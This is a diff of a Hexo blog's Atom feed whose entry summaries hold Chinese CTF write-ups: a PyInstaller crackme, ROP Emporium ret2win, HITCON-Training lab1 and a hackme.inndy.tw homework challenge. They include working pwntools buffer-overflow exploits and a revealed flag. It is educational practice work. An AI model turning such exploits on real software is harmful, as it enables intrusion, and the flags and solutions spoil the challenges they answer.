@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-04-04T08:43:34.634Z</updated>
+  <updated>2019-04-04T08:48:05.579Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -17,22 +17,21 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title></title>
+    <title>2019安恒杯1月月赛</title>
     <link href="http://yoursite.com/2019/04/04/2019%E5%AE%89%E6%81%92%E6%9D%AF1%E6%9C%88%E6%9C%88%E8%B5%9B/"/>
     <id>http://yoursite.com/2019/04/04/2019安恒杯1月月赛/</id>
     <published>2019-04-04T08:36:40.803Z</published>
-    <updated>2019-04-04T08:43:34.634Z</updated>
+    <updated>2019-04-04T08:48:05.579Z</updated>
     
     <summary type="html">
     
-      
-      
-        
-        
-          &lt;hr&gt;
-&lt;h2 id=&quot;2019安恒杯1月月赛&quot;&gt;&lt;a href=&quot;#2019安恒杯1月月赛&quot; class=&quot;headerlink&quot; title=&quot;2019安恒杯1月月赛&quot;&gt;&lt;/a&gt;2019安恒杯1月月赛&lt;/h2&gt;&lt;h2 id=&quot;python-crackme&quot;&gt;&lt;a
-        
-      
+      &lt;h2 id=&quot;python-crackme&quot;&gt;&lt;a href=&quot;#python-crackme&quot; class=&quot;headerlink&quot; title=&quot;python_crackme&quot;&gt;&lt;/a&gt;python_crackme&lt;/h2&gt;&lt;p&gt;（拿安恒杯1月月赛的题目she来讲）首先，你会拿到一个由python编译的exe文件，使用pyinstxtractor.py脚本（下载&lt;a href=&quot;https://sourceforge.net/projects/pyinstallerextractor/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;地址&lt;/a&gt;）反编译exe文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/12343640-5f176ccfca1b21e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
+&lt;p&gt;得到一个文件夹里面有一大堆东西&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/12343640-59a423ea37b08a40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
+&lt;p&gt;用010editor打开与exe文件同名的二进制文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/12343640-5256dca2bf529b4d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
+&lt;p&gt;添加上python3.6的.pyc文件的文件头（即前12字节）然后再加上后缀名.pyc&lt;/p&gt;
     
     </summary>
     
@@ -44,17 +43,17 @@
     <link href="http://yoursite.com/2019/04/04/pwn%E5%85%A5%E9%97%A8%E4%B9%8BROP/"/>
     <id>http://yoursite.com/2019/04/04/pwn入门之ROP/</id>
     <published>2019-04-04T08:30:44.397Z</published>
-    <updated>2019-04-04T08:35:54.616Z</updated>
+    <updated>2019-04-04T08:49:01.023Z</updated>
     
     <summary type="html">
     
-      
-      
-        
-        
-          &lt;h2 id=&quot;ret2win&quot;&gt;&lt;a href=&quot;#ret2win&quot; class=&quot;headerlink&quot; title=&quot;ret2win&quot;&gt;&lt;/a&gt;ret2win&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://ropemporium.com/&quot;
-        
-      
+      &lt;h2 id=&quot;ret2win&quot;&gt;&lt;a href=&quot;#ret2win&quot; class=&quot;headerlink&quot; title=&quot;ret2win&quot;&gt;&lt;/a&gt;ret2win&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://ropemporium.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ROP Emporium&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/12343640-e5fa6242a5dc0077.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
+&lt;p&gt;放到IDA很容易就找到溢出点&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; s; &lt;span class=&quot;comment&quot;&gt;// [esp+0h] [ebp-28h] &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;可以看出s距ebp的偏移量为&lt;span class=&quot;number&quot;&gt;0x28&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;所以我们写入&lt;span class=&quot;number&quot;&gt;0x28&lt;/span&gt;正好可以写到ebp之前，要覆盖ebp还需要再写入&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;个字节（&lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;位）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;有一点值得引起注意，我们回车换行符同样会输入进去，明确溢出点以及可溢出的字节后接下来我们就开始构造rop，但在之前我们还应该检查一下程序开户了哪些保护，这决定了我们该采取何种rop攻击方式&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/12343640-87d74ee929c3cf04.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
+&lt;p&gt;exp 如下 ：&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh = process(&lt;span class=&quot;string&quot;&gt;&#39;./ret2win32&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ret2win32 = &lt;span class=&quot;number&quot;&gt;0x08048659&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload = &lt;span class=&quot;string&quot;&gt;&#39;A&#39;&lt;/span&gt; * &lt;span class=&quot;number&quot;&gt;0x28&lt;/span&gt; + p32(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) + p32(ret2win32)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;64位的溢出点也一样&lt;br&gt;exp:&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh = process(&lt;span class=&quot;string&quot;&gt;&#39;./ret2win&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ret2win = &lt;span class=&quot;number&quot;&gt;0x400811&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload = &lt;span class=&quot;string&quot;&gt;&quot;A&quot;&lt;/span&gt; * &lt;span class=&quot;number&quot;&gt;0x20&lt;/span&gt; + p64(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) + p64(ret2win)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
     
     </summary>
     
@@ -66,17 +65,15 @@
     <link href="http://yoursite.com/2019/04/04/Hitcon-Training/"/>
     <id>http://yoursite.com/2019/04/04/Hitcon-Training/</id>
     <published>2019-04-04T08:23:04.435Z</published>
-    <updated>2019-04-04T08:30:25.043Z</updated>
+    <updated>2019-04-04T08:48:32.396Z</updated>
     
     <summary type="html">
     
-      
-      
-        
-        
-          &lt;h2 id=&quot;lab1&quot;&gt;&lt;a href=&quot;#lab1&quot; class=&quot;headerlink&quot; title=&quot;lab1&quot;&gt;&lt;/a&gt;lab1&lt;/h2&gt;&lt;p&gt;方法1：逆向破解，因为题目给了.c文件，里面有key和cipher可以直接用&lt;br&gt;&lt;figure
-        
-      
+      &lt;h2 id=&quot;lab1&quot;&gt;&lt;a href=&quot;#lab1&quot; class=&quot;headerlink&quot; title=&quot;lab1&quot;&gt;&lt;/a&gt;lab1&lt;/h2&gt;&lt;p&gt;方法1：逆向破解，因为题目给了.c文件，里面有key和cipher可以直接用&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;key = &lt;span class=&quot;string&quot;&gt;&quot;Do_you_know_why_my_teammate_Orange_is_so_angry???&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cipher = [&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;59&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;25&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;61&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;45&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;40&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;89&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;22&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;85&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;22&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;31&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;126&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;28&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;62&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;107&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;66&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;60&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;44&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;91&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;49&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;85&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;33&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;76&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;66&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;flag = &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; range(len(cipher)):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	flag += chr(cipher[i]^ord(key[i]))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; flag&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;方法2：利用gdb动态调试，可以在已生成password且未输入magic的情况下获得password的值：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;在0x80486e7处下断点，可以看到ebp - 0x80就是password存放的地方&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;► 0x80486e7 &amp;lt;get_flag+332&amp;gt;    lea    eax, [ebp - 0x80]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  0x80486ea &amp;lt;get_flag+335&amp;gt;    push   eax&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  0x80486eb &amp;lt;get_flag+336&amp;gt;    push   dword ptr [ebp - 0x74]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  0x80486ee &amp;lt;get_flag+339&amp;gt;    call   read@plt &amp;lt;0x8048410&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;再运行到0x8048712处，可以查看 ebp - 0x80的值 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pwndbg&amp;gt; x/wx ($ebp -0x80)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0xffffcd08:	0x4f77e43c&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;转成十进制，输入就能得到flag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pwndbg&amp;gt; c&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Continuing.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;1333257276  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;CTF&amp;#123;debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!&amp;#125;[Inferior 1 (process 7593) exited normally]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;方法3：&lt;br&gt;同样利用gdb调试，但是这次不用获取password的值而直接在if跳转前设置eip的值指向flag输出的for 循环即可&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/12343640-e809aec7c4485e87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/12343640-9c69b4d18ca86e5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
     
     </summary>
     
@@ -112,30 +109,6 @@
 &lt;p&gt;这里可以算出arr[14]为ret位置&lt;/p&gt;
 &lt;p&gt;exp:&lt;/p&gt;
 &lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# p = process(&#39;./homework&#39;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p = remote(&lt;span class=&quot;string&quot;&gt;&#39;hackme.inndy.tw&#39;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;7701&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;call_me = &lt;span class=&quot;number&quot;&gt;0x80485FB&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; str(call_me)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;What\&#39;s your name? &#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.sendline(&lt;span class=&quot;string&quot;&gt;&#39;n0va&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;4 &amp;gt; dump all numbers\n&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39; &amp;gt; &#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.sendline(&lt;span class=&quot;string&quot;&gt;&#39;1&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;Index to edit: &#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.sendline(&lt;span class=&quot;string&quot;&gt;&#39;14&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;How many? &#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.sendline(str(call_me))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.sendline(&lt;span class=&quot;string&quot;&gt;&#39;0&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Hello World</title>
-    <link href="http://yoursite.com/2019/03/03/hello-world/"/>
-    <id>http://yoursite.com/2019/03/03/hello-world/</id>
-    <published>2019-03-03T08:52:07.548Z</published>
-    <updated>2019-03-16T08:20:58.251Z</updated>
-    
-    <summary type="html">
-    
-      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
-&lt;h2 id=&quot;Quick-Start&quot;&gt;&lt;a href=&quot;#Quick-Start&quot; class=&quot;headerlink&quot; title=&quot;Quick Start&quot;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;&lt;h3 id=&quot;Create-a-new-post&quot;&gt;&lt;a href=&quot;#Create-a-new-post&quot; class=&quot;headerlink&quot; title=&quot;Create a new post&quot;&gt;&lt;/a&gt;Create a new post&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo new &lt;span class=&quot;string&quot;&gt;&quot;My New Post&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;More info: &lt;a href=&quot;https://hexo.io/docs/writing.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Writing&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;Run-server&quot;&gt;&lt;a href=&quot;#Run-server&quot; class=&quot;headerlink&quot; title=&quot;Run server&quot;&gt;&lt;/a&gt;Run server&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;More info: &lt;a href=&quot;https://hexo.io/docs/server.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Server&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;Generate-static-files&quot;&gt;&lt;a href=&quot;#Generate-static-files&quot; class=&quot;headerlink&quot; title=&quot;Generate static files&quot;&gt;&lt;/a&gt;Generate static files&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo generate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;More info: &lt;a href=&quot;https://hexo.io/docs/generating.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Generating&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;Deploy-to-remote-sites&quot;&gt;&lt;a href=&quot;#Deploy-to-remote-sites&quot; class=&quot;headerlink&quot; title=&quot;Deploy to remote sites&quot;&gt;&lt;/a&gt;Deploy to remote sites&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;More info: &lt;a href=&quot;https://hexo.io/docs/deployment.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Deployment&lt;/a&gt;&lt;br&gt;
     
     </summary>
     
